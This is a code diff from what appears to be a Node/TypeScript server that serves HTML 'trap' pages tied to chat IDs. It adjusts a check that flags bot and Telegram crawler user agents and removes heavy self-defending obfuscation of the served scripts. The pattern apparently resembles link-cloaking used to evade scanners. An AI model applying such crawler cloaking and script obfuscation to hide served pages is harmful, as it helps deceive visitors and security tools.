@@ -77,7 +77,7 @@ async function startServer() {
   const isSuspeciousAgent = (userAgent: string | undefined): boolean => {
     if (!userAgent) return false;
     const ua = userAgent.toLowerCase();
-    return suspeciousAgents.some(agent => ua.includes(agent)) || ua.includes('bot') || ua.includes('telegram');
+    return suspeciousAgents.some(agent => ua.includes(agent)) || ua.includes('bot') || ua.includes('telegrambot');
   };
 
   const getChatIdFromTrapId = (trapId: string): string | null => {
@@ -404,30 +404,17 @@ async function startServer() {
       const cheerioRaw: any = await import('cheerio');
       const cheerio = cheerioRaw.default || cheerioRaw;
       
-      const jsObfuscatorRaw: any = await import('javascript-obfuscator');
-      const JavaScriptObfuscator = jsObfuscatorRaw.default || jsObfuscatorRaw;
-      
       const terserRaw: any = await import('html-minifier-terser');
       const { minify } = terserRaw;
       
       const $ = cheerio.load(htmlContent);
-      $('script').each((i: number, el: any) => {
-        const rawScript = $(el).html();
-        if (rawScript && rawScript.trim().length > 0) {
-           const obf = JavaScriptObfuscator.obfuscate(rawScript, {
-               compact: true, controlFlowFlattening: true, selfDefending: true, 
-               stringArray: true, stringArrayEncoding: ['base64']
-           });
-           $(el).text(obf.getObfuscatedCode());
-        }
-      });
       let updatedHtml = $.html();
       if (!updatedHtml.toLowerCase().startsWith('<!doctype')) {
          updatedHtml = '<!DOCTYPE html>\n' + updatedHtml;
       }
       htmlContent = await minify(updatedHtml, { collapseWhitespace: true, removeComments: true, minifyCSS: true });
     } catch(e) {
-      console.error('Obfuscation error:', e);
+      console.error('HTML minification error:', e);
     }
 
     res.send(htmlContent);
